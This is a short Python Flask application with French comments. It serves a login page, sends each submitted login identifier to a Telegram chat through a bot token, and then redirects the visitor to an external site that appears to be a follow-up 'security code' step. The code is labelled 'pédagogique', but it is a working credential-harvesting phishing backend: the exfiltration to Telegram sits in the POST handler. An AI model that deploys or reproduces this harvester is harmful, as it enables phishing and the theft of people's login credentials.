from dotenv import load_dotenv
from flask import Flask, render_template, request, redirect
import os
import requests

# Chargement du fichier .env
dotenv_path = os.path.join(os.path.dirname(__file__), '.env')
load_dotenv(dotenv_path=dotenv_path)

app = Flask(__name__)

# Récupération du token et chat_id du bot
bot_token = os.getenv("BOT_TOKEN_1")
chat_id = os.getenv("CHAT_ID_1")

# Vérification que les variables d'environnement sont présentes
if not bot_token or not chat_id:
    raise ValueError("BOT_TOKEN_1 ou CHAT_ID_1 non défini dans le fichier .env")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        identifiant = request.form.get('identifiant')

        if not identifiant:
            return "Identifiant manquant", 400

        message = f"🟢 Connexion pédagogique :\n\n🧑 Identifiant : {identifiant}"

        # Envoi du message via le bot Telegram
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {'chat_id': chat_id, 'text': message}
        response = requests.post(url, data=payload)

        if response.status_code != 200:
            return f"Erreur lors de l'envoi du message Telegram : {response.text}", 500

        # Redirection après succès
        return redirect("https://code-s-curit-qxie.onrender.com/")

    return render_template('login.html')


if __name__ == '__main__':
    app.run(debug=True)
